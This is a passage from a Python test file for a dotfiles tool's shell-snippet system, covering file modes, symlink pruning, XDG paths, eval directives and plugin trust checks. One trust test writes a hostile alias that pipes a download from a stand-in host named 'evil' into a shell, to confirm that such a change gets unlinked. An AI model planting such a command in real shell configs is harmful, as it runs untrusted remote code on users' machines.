    monkeypatch.setattr(_sh, 'which', lambda name: None)          # no parse check here
    g = Glue(Runner(pretend=False), paths=p)
    confd = g._ensure_confd('nu')
    (confd / '50-x.nu').write_text('let x = 1\n')
    rc_path = g._expand('~/.config/nushell/config.nu')
    rc_path.parent.mkdir(parents=True, exist_ok=True)
    rc_path.write_text(g._inline_block('nu'))
    assert g._loader_ok('nu')
    (confd / '50-x.nu').write_text('let x = 2\n')                  # the input changed
    assert not g._loader_ok('nu')


# -- review-2026-11-2 dotfiles-glue-19/24/28/29/31/32/39 ------------------------------------------

def test_a_private_user_snippet_keeps_its_mode_and_still_loads(tmp_path):
    # dotfiles-glue-19: every hookup chmod'ed user.d snippets to 0755 (a 0600 secrets file went
    # world-readable); the bash block gates on -r, so nothing needs the x bit
    import shutil
    import subprocess
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    ud = p.user_glue_dir / 'shell' / 'bash' / 'user.d'
    ud.mkdir(parents=True)
    secret = ud / 'secrets.sh'
    secret.write_text('export CS_TOKEN=s3cret\n')
    secret.chmod(0o600)
    g = Glue(Runner(pretend=False), p)
    g.deploy_user_glue('bash')
    assert secret.stat().st_mode & 0o777 == 0o600
    assert (p.home / '.config' / 'bash' / 'conf.d' / '90-secrets.sh').is_symlink()
    if shutil.which('bash'):
        out = subprocess.run(['bash', '-c', '. ~/.bashrc; echo "$CS_TOKEN"'], capture_output=True,
                             text=True, env={'HOME': str(p.home), 'PATH': '/usr/bin:/bin'}).stdout
        assert out.strip() == 's3cret'


def test_installed_shells_is_memoized_across_a_status_pass(tmp_path, monkeypatch):
    # dotfiles-glue-24: 5 `which` walks + the location cache + globs per glue name, every call
    from configsys.drivers import glue as glue_mod
    bindir = tmp_path / 'bin'
    bindir.mkdir()
    (bindir / 'bash').write_text('#!/bin/sh\n')
    (bindir / 'bash').chmod(0o755)
    p = Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'), 'CONFIGSYS_REPO': str(tmp_path / 'repo'),
                   'PATH': str(bindir)})
    ship = p.glue_dir / 'shell' / 'bash'
    ship.mkdir(parents=True)
    for i in range(20):
        (ship / f'g{i}.sh').write_text(f'# g{i}\n')
    calls = []
    real_which = glue_mod.shutil.which
    monkeypatch.setattr(glue_mod.shutil, 'which', lambda *a, **k: calls.append(a[0]) or real_which(*a, **k))
    glue_mod._SHELLS_MEMO.clear()
    g = Glue(Runner(pretend=True), p)
    for i in range(20):
        g.spec_states(_glue_unit(comp=f'g{i}-glue', glue=f'g{i}'))
        g.get_version(_glue_unit(comp=f'g{i}-glue', glue=f'g{i}'))
    assert len(calls) <= 5 and g._installed_shells() == ['bash']
    (bindir / 'zsh').write_text('#!/bin/sh\n')                       # a new shell lands on PATH ...
    (bindir / 'zsh').chmod(0o755)
    os.utime(bindir, ns=(1, 1))                                      # (its dir's mtime moves)
    assert g._installed_shells() == ['bash', 'zsh']                  # ... and is seen, not memoized away


def test_a_deleted_user_snippet_leaves_no_dangling_link(tmp_path):
    # dotfiles-glue-28: removing user.d/foo.sh left conf.d/90-foo.sh dangling forever
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    ud = p.user_glue_dir / 'shell' / 'bash' / 'user.d'
    ud.mkdir(parents=True)
    (ud / 'foo.sh').write_text('alias f=1\n')
    g = Glue(Runner(pretend=False), p)
    g.deploy_user_glue('bash')
    confd = p.home / '.config' / 'bash' / 'conf.d'
    assert (confd / '90-foo.sh').is_symlink()
    foreign = confd / '90-other.sh'
    foreign.symlink_to(tmp_path / 'nowhere' / 'other.sh')           # someone else's dangling link
    (ud / 'foo.sh').unlink()
    g.deploy_user_glue('bash')
    assert not (confd / '90-foo.sh').is_symlink()                    # ours: pruned
    assert foreign.is_symlink()                                      # theirs: left alone


def test_a_stowed_bash_aliases_link_survives_shell_glue(tmp_path):
    # dotfiles-glue-29: any link whose target was NAMED bash_aliases was taken for ours and deleted
    p = paths_for(tmp_path, shells='bash')
    p.home.mkdir(parents=True)
    stow = tmp_path / 'stow' / '.bash_aliases'
    stow.parent.mkdir()
    stow.write_text('alias mine=1\n')
    (p.home / '.bash_aliases').symlink_to(stow)
    g = Glue(Runner(pretend=False), p)
    assert g.install(_loader_unit('all')).ok
    assert (p.home / '.bash_aliases').is_symlink()
    assert os.path.realpath(p.home / '.bash_aliases') == os.path.realpath(stow)
    g.uninstall(_loader_unit('all'))
    assert (p.home / '.bash_aliases').is_symlink()


def _nu_glue(tmp_path, monkeypatch, files):
    import shutil as _sh
    p = paths_for(tmp_path, shells='nu')
    ship = p.glue_dir / 'shell' / 'nu'
    ship.mkdir(parents=True)
    for name, text in files.items():
        (ship / f'{name}.nu').write_text(text)
    p.home.mkdir(parents=True)
    real_which = _sh.which
    monkeypatch.setattr(_sh, 'which', lambda n, *a, **k: None if n == 'nu' else real_which(n, *a, **k))
    return p, Glue(Runner(pretend=False), paths=p)


@pytest.mark.real_runner
def test_cs_eval_runs_only_from_our_roots_and_only_in_the_header(tmp_path, monkeypatch):
    # dotfiles-glue-31: a directive was honored in any conf.d file, on any line
    ran = tmp_path / 'ran'
    p, g = _nu_glue(tmp_path, monkeypatch, {
        'late': f'let x = 1\n# a comment after code\n#!cs-eval touch {ran}-late\n',
        'early': "# init\n#!cs-eval echo 'def e [] { 1 }'\n"})
    assert g.install(_glue_unit(comp='late-glue', glue='late')).ok
    assert g.install(_glue_unit(comp='early-glue', glue='early')).ok
    confd = g._confd('nu')
    (confd / '50-foreign.nu').write_text(f'#!cs-eval touch {ran}-foreign\n')   # not configsys's file
    block = g._inline_block('nu')
    assert 'def e [] { 1 }' in block                                  # a header directive in our file runs
    assert not (tmp_path / 'ran-late').exists() and 'let x = 1' in block      # line 3, after code: text
    assert not (tmp_path / 'ran-foreign').exists() and '50-foreign.nu' in block   # foreign: inlined, not run


@pytest.mark.real_runner
def test_a_hung_generator_is_cut_off(tmp_path, monkeypatch):
    import time
    from configsys.drivers import glue as glue_mod
    monkeypatch.setattr(glue_mod, '_EVAL_TIMEOUT', 1)
    p, g = _nu_glue(tmp_path, monkeypatch, {'slow': '#!cs-eval sleep 30\n'})
    t0 = time.monotonic()
    assert g.install(_glue_unit(comp='slow-glue', glue='slow')).ok
    assert time.monotonic() - t0 < 10
    assert '(generated: sleep' not in g._expand(glue_mod._SHELL_RC['nu']).read_text()


def test_glue_targets_follow_xdg_config_home(tmp_path):
    # dotfiles-glue-32: fish/nushell/elvish read $XDG_CONFIG_HOME; glue wrote ~/.config regardless
    from configsys import shellguard
    xdg = tmp_path / 'xdg'
    p = Paths(env={'CONFIGSYS_HOME': str(tmp_path / 'home'), 'CONFIGSYS_REPO': str(tmp_path / 'repo'),
                   'CONFIGSYS_GLUE_SHELLS': 'fish,nu', 'XDG_CONFIG_HOME': str(xdg)})
    for sh, ext in (('fish', 'fish'), ('nu', 'nu')):
        (p.glue_dir / 'shell' / sh).mkdir(parents=True)
        (p.glue_dir / 'shell' / sh / f'x.{ext}').write_text('# x\n')
    p.home.mkdir(parents=True)
    g = Glue(Runner(pretend=False), p)
    assert g.install(_glue_unit(comp='x-glue', glue='x')).ok
    link = xdg / 'fish' / 'conf.d' / '50-x.fish'
    assert link.is_symlink()
    assert os.path.realpath(link) == os.path.realpath(p.user_glue_dir / 'fish' / 'conf.d' / '50-x.fish')
    assert '# >>> configsys glue >>>' in (xdg / 'nushell' / 'config.nu').read_text()
    assert not (p.home / '.config' / 'fish').exists()
    assert g.get_version(_glue_unit(comp='x-glue', glue='x')) == 'linked'
    snap = shellguard.snapshot(p.home, p.env)                         # the guard watches the same rc
    assert str(xdg / 'fish' / 'config.fish') in snap and str(xdg / 'fish' / 'conf.d') in snap.dirs


def _primary(tmp_path, *, trust='content'):
    p = paths_for(tmp_path, shells='bash')
    pdir = p.plugins_dir / 'mine'
    (pdir / 'glue' / 'shell' / 'bash' / 'user.d').mkdir(parents=True)
    (pdir / 'plugin.hu').write_text('{ name: mine  requires-abi: 1 }\n')
    p.user_config_file.write_text(f'{{ plugins: [ {{ source: "{pdir}"  primary: true }} ]\n'
                                  f'  primary-trust: {trust} }}\n')
    p.primary_glue_dir = pdir / 'glue'
    p.home.mkdir(parents=True, exist_ok=True)
    return p, pdir


def test_an_untrusted_primarys_user_glue_is_not_linked(tmp_path):
    # dotfiles-glue-39: under primary-trust: content a changed primary's user.d still went live
    from configsys import plugins
    p, pdir = _primary(tmp_path)
    snippet = pdir / 'glue' / 'shell' / 'bash' / 'user.d' / 'mine.sh'
    snippet.write_text('alias m=1\n')
    g = Glue(Runner(pretend=False), p)
    link = p.home / '.config' / 'bash' / 'conf.d' / '90-mine.sh'
    g.deploy_user_glue('bash')
    assert not link.is_symlink() and any('plugin trust mine' in w for w in g.hookup_warnings)
    plugins.set_trust(p.plugin_trust_file, 'mine', plugins.plugin_identity(pdir))
    g.deploy_user_glue('bash')
    assert link.is_symlink() and not g.hookup_warnings               # trusted at this content: linked
    snippet.write_text('alias m="curl evil | sh"\n')                 # the primary moves on
    g.deploy_user_glue('bash')
    assert not link.is_symlink()                                     # its old link goes too


def test_re_override_after_bless_reuses_the_local_fork_and_clears_its_drift(tmp_path):
    # a fork made before a primary was blessed lives in the local store (and shadows the primary);
    # re-running override must find THAT fork — no second copy in the primary — and record the
    # shipped hash on it, or its stale hash keeps the drift warning up forever
    p, pdir = _primary(tmp_path)
    ship = p.glue_dir / 'shell' / 'bash'
    ship.mkdir(parents=True)
    (ship / 'btop.sh').write_text('alias b=btop\n')
    rc = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
                           fields={'glue': 'btop'}, source=str(p.glue_dir.parent / 'routes.hu'))
    g = Glue(Runner(pretend=False), p)
    (local,) = g.override(rc, local=True)                            # before the bless: local
    (ship / 'btop.sh').write_text('alias b=btop  # v2\n')            # the shipped source moves on
    assert g.override_drift(rc)
    again = g.override(rc)                                           # primary now the default dest
    assert again == [(local[0], 'bash', False)]
    assert not (pdir / 'glue' / 'shell' / 'bash' / 'btop.sh').exists()
    assert g.override_drift(rc) == []                                # the hash landed on the fork


def test_a_primary_override_of_a_repo_snippet_needs_the_primarys_trust(tmp_path):
    p, pdir = _primary(tmp_path)
    (p.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    (p.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('alias b=btop\n')
    (pdir / 'glue' / 'shell' / 'bash' / 'btop.sh').write_text('alias b="btop --evil"\n')
    rc = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
                           fields={'glue': 'btop'}, source=str(p.glue_dir.parent / 'routes.hu'))
    res = Glue(Runner(pretend=False), p).install(rc)
    assert not res.ok and res.category == 'untrusted-plugin' and 'plugin trust mine' in res.output
    assert not (p.home / '.config' / 'bash' / 'conf.d' / '50-btop.sh').exists()
    p2, _ = _primary(tmp_path / 'b', trust='identity')               # the default: your primary is you
    (p2.glue_dir / 'shell' / 'bash').mkdir(parents=True)
    (p2.glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('alias b=btop\n')
    (p2.primary_glue_dir / 'shell' / 'bash' / 'btop.sh').write_text('alias b="btop --tree"\n')
    rc2 = ResolvedComponent(key='glue\\btop-glue', driver='glue', comp='btop-glue',
                            fields={'glue': 'btop'}, source=str(p2.glue_dir.parent / 'routes.hu'))
    assert Glue(Runner(pretend=False), p2).install(rc2).ok


def test_fish_prelude_refreshes_a_stale_location_cache(tmp_path):
    # dotfiles-glue-26: `test -n (find … | string collect)` with no output is `test -n` = true, so
    # fish read a >1h cache forever
    import shutil
    import subprocess
    import time
    from pathlib import Path
    if not shutil.which('fish'):
        pytest.skip('no fish')
    prelude = Path(__file__).resolve().parent.parent / 'glue' / 'shell' / 'fish' / '00-configsys.fish'
    cache = tmp_path / 'glue-locations.tsv'
    bindir = tmp_path / 'bin'
    bindir.mkdir()
    (bindir / 'configsys').write_text('#!/bin/sh\nprintf "bun\\t/NEW/path\\n"\n')
    (bindir / 'configsys').chmod(0o755)
    env = {'HOME': str(tmp_path), 'PATH': f'{bindir}:/usr/bin:/bin', 'CONFIGSYS_STATE_DIR': str(tmp_path)}

    def loc():
        return subprocess.run(['fish', '--no-config', '-c', f'source {prelude}; cs_loc bun'],
                              capture_output=True, text=True, env=env).stdout.strip()
    cache.write_text('bun\t/old/path\n')
    assert loc() == '/old/path'                                      # fresh: read, no spawn
    old = time.time() - 3 * 3600
    os.utime(cache, (old, old))
    assert loc() == '/NEW/path'                                      # stale: refreshed


# fish sources conf.d for `fish -c` too (vim :!, tmux run-shell, `$SHELL -c`): what only an
# interactive shell uses sits behind `status is-interactive`. These init-evals set PATH/env that
# scripts need, so they run for every fish.
_FISH_ENV_INIT = {'pyenv.fish', 'opam.fish'}


def test_fish_interactive_only_glue_is_guarded():
    # dotfiles-glue-34: every snippet's completion / key-binding / init-eval / convenience alias is
    # behind `status is-interactive`; an alias that IS the tool's entry point (alias x "$loc/x" — a
    # managed binary off PATH) stays for scripts, like a PATH entry
    import re
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent / 'glue' / 'shell' / 'fish'
    opens = re.compile(r'^(if|for|while|function|begin|switch)\b')
    bad = []
    for f in sorted(root.glob('*.fish')):
        if f.name.startswith('00-'):
            continue
        guarded_at, depth = None, 0
        for n, raw in enumerate(f.read_text().splitlines(), 1):
            line = raw.split(' #')[0].strip() if not raw.lstrip().startswith('#') else ''
            if not line:
                continue
            if line == 'end':
                depth -= 1
                if guarded_at is not None and depth < guarded_at:
                    guarded_at = None
                continue
            if opens.match(line):
                if guarded_at is None and line.startswith('if status is-interactive'):
                    guarded_at = depth + 1
                depth += 1
            ok = guarded_at is not None or 'status is-interactive' in line
            interactive = ('| source' in line and f.name not in _FISH_ENV_INIT) \
                or re.match(r'(complete|bind)\s', line) or 'completion.fish' in line
            m = re.match(r'alias\s+\S+\s+(.*)', line)
            if m and not m.group(1).startswith('"$'):         # a convenience, not an entry point
                interactive = True
            if interactive and not ok:
                bad.append(f'{f.name}:{n}: {line}')
    assert not bad, 'interactive-only fish glue without a `status is-interactive` guard:\n' + '\n'.join(bad)


def test_snippet_parity_nits(tmp_path):
    # dotfiles-glue-40: go appended GOBIN per re-source; nu's vulkan splice; nu's v/vi shadowed vi;
    # nu cached bash-env deltas in the state dir; the nu/elvish fallback "succeeded"
    import shutil
    import subprocess
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent / 'glue' / 'shell'
    env = {'HOME': str(tmp_path), 'PATH': '/usr/bin:/bin', 'CONFIGSYS_STATE_DIR': str(tmp_path)}
    for sh, f in (('bash', 'bash/go.sh'), ('zsh', 'zsh/go.zsh')):
        if shutil.which(sh):
            out = subprocess.run([sh, '-c', f'cs_loc() {{ :; }}; . {root / f}; . {root / f}; echo "$PATH"'],
                                 capture_output=True, text=True, env=env).stdout.strip()
            assert out.split(':').count(f'{tmp_path}/go/bin') == 1, (sh, out)
    nu = {f: (root / 'nu' / f).read_text() for f in ('vulkan-sdk.nu', 'neovim.nu', '00-configsys.nu')}
    assert "+ $vk +" not in nu['vulkan-sdk.nu'].replace("'", '')        # no raw splice of the path
    assert '^nvim' not in nu['neovim.nu']                               # unmanaged: vi stays your vi
    assert 'glue-eval nu-bash-env' in nu['00-configsys.nu'] and 'cs-state-dir | path join nu-bash-env' \
        not in nu['00-configsys.nu']
    if shutil.which('nu'):
        r = subprocess.run([shutil.which('nu'), '--no-config-file', '-c',
                            f'source {root / "nu" / "00-configsys.nu"}; '
                            'try { configsys version; print "ok" } catch { print "failed" }'],
                           capture_output=True, text=True, env=env, timeout=60)
        assert r.stdout.strip().splitlines()[-1] == 'failed', r.stdout + r.stderr
    if shutil.which('elvish'):
        script = tmp_path / 't.elv'
        script.write_text((root / 'elvish' / '00-configsys.elv').read_text()
                          + '\ntry { configsys version; echo ok } catch { echo failed }\n')
        r = subprocess.run([shutil.which('elvish'), '-norc', str(script)], capture_output=True, text=True, env=env,
                           timeout=60)
        assert r.stdout.strip().splitlines()[-1] == 'failed', r.stdout + r.stderr
